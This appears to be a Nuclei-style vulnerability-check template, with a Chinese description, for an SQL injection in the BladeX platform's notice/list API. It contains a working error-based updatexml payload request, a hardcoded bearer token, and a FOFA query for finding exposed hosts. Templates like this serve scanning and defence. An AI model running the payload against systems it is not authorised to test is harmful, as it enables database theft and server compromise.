id: BladeX-notice_list-sql

info:
  name: BladeX企业级开发平台 notice/list SQL 注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="https://bladex.vip"
    BladeX企业级开发平台 notice/list 存在sql注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140977475
  tags: sql injection


http:
  - raw:
      - |
        GET /api/blade-desk/notice/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ

    matchers:
      - type: word
        part: body
        words:
          - 'java.sql.SQLException'






